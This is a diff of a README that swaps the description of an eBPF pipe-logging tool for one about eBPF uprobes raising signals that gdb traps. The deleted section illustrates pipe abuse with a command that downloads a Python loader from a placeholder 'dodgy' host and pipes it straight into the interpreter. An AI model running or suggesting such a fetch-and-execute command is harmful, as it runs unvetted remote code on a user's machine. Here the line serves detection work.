@@ -1,40 +1,29 @@
-# BPF-PipeSnoop
-Simple program to log data being based in using shell pipes (`|`)
+# BPF-UprobeDBG
+Super simple example of how you can raise signals in eBPF Uprobe programs, to be trapped by a debugger.
+This means you can use eBPF to determine when to break into a program.
 
-# Overview
-Shells can parse data between programs using pipes, e.g.:
+90% of the code is from [Libpf-Bootstrap](https://github.com/libbpf/libbpf-bootstrap)
+
+# Build
 ```bash
-curl https://dodgy.com/loader.py | python -
-```
-
-In this example, a python script is downloaded from the internet and executed,
-without the file being written to disk, and its content is not visible on the commnandline.
-
-
-`pipesnoop` is a demonstration of how you could detect when data is being passed using pipes
-and log it, all using eBPF.
-
-# Building
-```bash
-# First clone the repository and the libbpf submodule
-git clone --recursive <repo_url>
-cd bpf-pipesnoop/src
-
+git clone --recursive https://github.com/pathtofile/bpf-uprobedbg.git
+cd bpf-uprobedbg/src
 make
 ```
-This should generate the program `pipesnoop` in the same directory.
 
 # Running
-Just run as root and watch the output:
+To show how it works, run via `gdb`. When the loop runs for the 3rd time,
+the program will throw a `SIGTERM`, which will be trapped by GDB so you can inspect it:
 ```bash
-sudo ./pipesnoop
+sudo gdb ./uprobe
+```
+Run the program, and gdb will break when the eBPF program raises the SIGINT.
+
+In a seperate window, you can also run the following to see the debug logs from the bpf program:
+```bash
+sudo cat /sys/kernel/debug/tracing/trace_pipe
 ```
 
-
-# How it works
-
-
-
-
 # Aknowledgements
-The skeleton of this project was made with the help of [Libpf-Bootstrap](https://github.com/libbpf/libbpf-bootstrap).
+- [@williballenthin](https://twitter.com/williballenthin) for the idea!
+- [Libpf-Bootstrap](https://github.com/libbpf/libbpf-bootstrap) team
